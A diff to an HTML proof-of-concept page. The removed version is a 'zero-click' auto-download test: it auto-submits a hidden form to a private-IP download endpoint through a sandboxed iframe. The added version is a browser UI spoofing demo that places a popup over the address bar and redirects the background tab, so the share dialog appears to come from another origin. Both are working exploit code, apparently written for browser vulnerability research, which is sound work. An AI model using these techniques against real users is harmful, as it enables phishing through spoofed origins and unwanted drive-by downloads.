@@ -1,24 +1,38 @@
+<!doctype html>
 <html>
-
 <head>
-    <title>POC Auto Download Zero-Click</title>
+<style>
+html { font-family: sans-serif; }
+#linkElem {
+  position: absolute;
+  top: 320px;
+  left: calc(50vw - 115px);
+  width: 230px;
+  text-align: center;
+  font-size: 1.5em;
+}
+</style>
 </head>
-
 <body>
-    <h1>Test Auto-Download Tanpa Klik</h1>
-    <p>Tunggu sebentar, sedang mencoba trigger download otomatis...</p>
-    <iframe name="target_form_frame" sandbox="allow-scripts allow-forms" width="300" height="50"
-        style="border: 1px solid red;"></iframe>
-    <form id="kontolKontol" action="http://10.49.93.4:5000/download" target="target_form_frame" method="GET">
-        <input type="hidden" name="payload" value="bypass_test">
-    </form>
-    <script>
-        try {
-            document.getElementById('kontolKontol').submit();
-        } catch (e) {
-            console.log("Form submit error", e);
-        }
-    </script>
-</body>
+<h1>Web Share over browser UI, short window</h1>
+<p>Opens popup which receives activation on second click which then shows share UI over address bar/browser UI, makes it seem like background tab is origin since popup origin and window controls are covered</p>
+<a id="linkElem" href="#">Click twice to go to Example.com</a>
+<script>
+linkElem.addEventListener('click', (e) => {
+  e.preventDefault();
+  var topPos = 200 + window.screenTop;
+  var popupWidth = 340;
+  var leftPos = (window.innerWidth / 2) - (popupWidth / 2) + window.screenLeft;
+  window.open(
+    'share-shortwin-popup.html',
+    'test',
+    'width='+popupWidth+',height=340,top='+topPos+',left='+leftPos
+  );
 
+  setTimeout(() => {
+    window.location = 'https://example.com';
+  }, 100);
+});
+</script>
+</body>
 </html>
